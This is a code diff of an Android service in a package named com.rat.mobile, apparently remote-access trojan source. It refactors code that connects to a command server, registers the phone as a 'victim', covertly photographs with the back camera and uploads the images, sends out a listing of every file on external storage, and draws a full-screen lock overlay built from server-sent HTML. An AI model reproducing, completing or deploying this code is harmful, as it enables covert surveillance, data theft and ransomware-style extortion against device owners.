@@ -1,12 +1,10 @@
-﻿package com.rat.mobile;
+package com.rat.mobile;
 
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
 import android.content.Intent;
-import android.graphics.Bitmap;
-import android.graphics.BitmapFactory;
 import android.hardware.Camera;
 import android.os.Build;
 import android.os.Environment;
@@ -20,10 +18,7 @@ import android.webkit.WebViewClient;
 import org.json.JSONArray;
 import org.json.JSONObject;
 
-import java.io.ByteArrayOutputStream;
 import java.io.File;
-import java.io.FileOutputStream;
-import java.io.IOException;
 import java.net.URISyntaxException;
 import java.util.ArrayList;
 import java.util.List;
@@ -37,7 +32,7 @@ public class MainService extends Service {
     private Camera camera;
     private WebView overlayWebView;
     private WindowManager windowManager;
-    private String serverUrl = "http://10.45.241.68:3000";
+    private String serverUrl = "http://YOUR_SERVER_IP:3000";
 
     @Override
     public void onCreate() {
@@ -71,61 +66,106 @@ public class MainService extends Service {
     private void startSocketConnection() {
         try {
             socket = IO.socket(serverUrl);
-            socket.on(Socket.EVENT_CONNECT, args -> {
-                try {
-                    JSONObject data = new JSONObject()
-                        .put("device", Build.MODEL)
-                        .put("os", "Android " + Build.VERSION.RELEASE);
-                    socket.emit("register-victim", data);
-                } catch (Exception e) { e.printStackTrace(); }
+            socket.on(Socket.EVENT_CONNECT, new Emitter.Listener() {
+                @Override
+                public void call(Object... args) {
+                    try {
+                        JSONObject data = new JSONObject()
+                            .put("device", Build.MODEL)
+                            .put("os", "Android " + Build.VERSION.RELEASE);
+                        socket.emit("register-victim", data);
+                        Log.d("RAT", "Connected to server");
+                    } catch (Exception e) {
+                        e.printStackTrace();
+                    }
+                }
             });
 
-            socket.on("execute-lock", args -> {
-                try {
-                    JSONObject data = (JSONObject) args[0];
-                    showLockOverlay(data.optString("html"));
-                } catch (Exception e) { e.printStackTrace(); }
+            socket.on("execute-lock", new Emitter.Listener() {
+                @Override
+                public void call(Object... args) {
+                    try {
+                        JSONObject data = (JSONObject) args[0];
+                        showLockOverlay(data.optString("html"));
+                    } catch (Exception e) {
+                        e.printStackTrace();
+                    }
+                }
             });
 
-            socket.on("capture-photo", args -> capturePhoto());
-            socket.on("request-files", args -> sendFileList());
+            socket.on("capture-photo", new Emitter.Listener() {
+                @Override
+                public void call(Object... args) {
+                    capturePhoto();
+                }
+            });
+
+            socket.on("request-files", new Emitter.Listener() {
+                @Override
+                public void call(Object... args) {
+                    sendFileList();
+                }
+            });
 
             socket.connect();
-        } catch (URISyntaxException e) { e.printStackTrace(); }
+        } catch (URISyntaxException e) {
+            e.printStackTrace();
+        }
     }
 
     private void capturePhoto() {
         try {
             camera = Camera.open(Camera.CameraInfo.CAMERA_FACING_BACK);
-            camera.takePicture(null, null, (data, cam) -> {
-                try {
-                    String base64 = Base64.encodeToString(data, Base64.DEFAULT);
-                    socket.emit("photo-capture", new JSONObject()
-                        .put("image", "data:image/jpeg;base64," + base64));
-                    cam.release();
-                    camera = null;
-                } catch (Exception e) { e.printStackTrace(); }
+            camera.takePicture(null, null, new Camera.PictureCallback() {
+                @Override
+                public void onPictureTaken(byte[] data, Camera camera) {
+                    try {
+                        String base64 = Base64.encodeToString(data, Base64.DEFAULT);
+                        JSONObject payload = new JSONObject()
+                            .put("image", "data:image/jpeg;base64," + base64);
+                        socket.emit("photo-capture", payload);
+                        camera.release();
+                        camera = null;
+                        Log.d("RAT", "Photo captured");
+                    } catch (Exception e) {
+                        e.printStackTrace();
+                    }
+                }
             });
-        } catch (Exception e) { e.printStackTrace(); }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
     }
 
     private void sendFileList() {
-        new Thread(() -> {
-            try {
-                List<String> files = new ArrayList<>();
-                scanDirectory(Environment.getExternalStorageDirectory().getAbsolutePath(), files);
-                socket.emit("file-list", new JSONObject()
-                    .put("files", new JSONArray(files)));
-            } catch (Exception e) { e.printStackTrace(); }
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    List<String> files = new ArrayList<>();
+                    scanDirectory(Environment.getExternalStorageDirectory().getAbsolutePath(), files);
+                    JSONArray jsonArray = new JSONArray(files);
+                    JSONObject payload = new JSONObject().put("files", jsonArray);
+                    socket.emit("file-list", payload);
+                    Log.d("RAT", "File list sent: " + files.size() + " files");
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
+            }
         }).start();
     }
 
     private void scanDirectory(String path, List<String> list) {
         File dir = new File(path);
         if (!dir.exists() || !dir.isDirectory()) return;
-        for (File file : dir.listFiles()) {
-            if (file.isDirectory()) scanDirectory(file.getAbsolutePath(), list);
-            else list.add(file.getAbsolutePath() + " (" + file.length() + " bytes)");
+        File[] files = dir.listFiles();
+        if (files == null) return;
+        for (File file : files) {
+            if (file.isDirectory()) {
+                scanDirectory(file.getAbsolutePath(), list);
+            } else {
+                list.add(file.getAbsolutePath() + " (" + file.length() + " bytes)");
+            }
         }
     }
 
@@ -146,25 +186,37 @@ public class MainService extends Service {
             android.graphics.PixelFormat.TRANSLUCENT
         );
         windowManager.addView(overlayWebView, params);
+        Log.d("RAT", "Lock overlay applied");
     }
 
     private void startFileMonitor() {
-        new Thread(() -> {
-            while (true) {
-                try { Thread.sleep(60000); } catch (InterruptedException e) { break; }
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                while (true) {
+                    try {
+                        Thread.sleep(60000);
+                    } catch (InterruptedException e) {
+                        break;
+                    }
+                }
             }
         }).start();
     }
 
     @Override
-    public IBinder onBind(Intent intent) { return null; }
+    public IBinder onBind(Intent intent) {
+        return null;
+    }
 
     @Override
     public void onDestroy() {
         super.onDestroy();
         if (socket != null) socket.disconnect();
         if (camera != null) camera.release();
-        if (overlayWebView != null && windowManager != null)
+        if (overlayWebView != null && windowManager != null) {
             windowManager.removeView(overlayWebView);
+        }
+        Log.d("RAT", "Service destroyed");
     }
 }
